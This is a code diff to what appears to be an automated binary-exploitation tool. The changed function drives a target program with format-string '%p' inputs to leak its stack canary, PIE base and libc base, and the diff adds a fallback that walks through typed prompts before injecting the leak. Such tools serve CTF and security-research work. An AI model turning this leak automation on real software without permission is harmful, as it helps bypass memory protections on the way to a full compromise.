@@ -1286,7 +1286,8 @@ def _gate_preambles(target_bytes=b"", strings=(), known_inputs=(), cap=6) -> lis
 
 
 def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
-                      mem_mb=2048, read_cap=64, strings=(), known_inputs=()) -> dict:
+                      mem_mb=2048, read_cap=64, strings=(), known_inputs=(),
+                      drive_prompts=False) -> dict:
     """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
     fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
     the classification plus the winning trigger, or empties when nothing was disclosed (the target
@@ -1374,6 +1375,26 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
         if cls["libc_base"] and cls["canary"]:              # enough to finish most chains
             best = {**cls, "trigger": trig, "dump": dump[:400]}
             break
+    # Fallback for a leak behind a TYPED prompt sequence: the single-write triggers above fail when
+    # the program reads several typed inputs (a number, a name) before the leaking sink -- a generic
+    # fill fails a scanf("%d") and the program aborts before the leak. Drive the prompts, answering
+    # each by its classified type, and inject the over-read at one input. Lazy import avoids the
+    # interaction<->leak cycle. OPT-IN (drive_prompts) and gated to a MULTI-READ target, because the
+    # prompt sweep spawns many processes -- the normal single-read exploit ladder must not pay it;
+    # only a hardened, prompt-gated path (the canary/PIE leak path) asks for it.
+    if (drive_prompts and not (best.get("canary") or best.get("pie_base") or best.get("libc_base"))):
+        try:
+            from .. import interaction
+            if len(interaction.read_sizes(target_bytes)) < 2:
+                return best                                  # single-read: first-write path suffices
+            d = interaction.drive_to_leak(exe, workdir, target_bytes, libc_data,
+                                          base_argv=base_argv, timeout=timeout)
+            if d.get("canary") or d.get("pie_base") or d.get("libc_base"):
+                best = {"pie_base": d.get("pie_base"), "libc_base": d.get("libc_base"),
+                        "canary": d.get("canary"), "trigger": b"", "recipe": d.get("recipe"),
+                        "dump": b"", "inject_at": d.get("inject_at")}
+        except Exception:                                    # noqa: BLE001 -- fallback is best-effort
+            pass
     return best
 
 
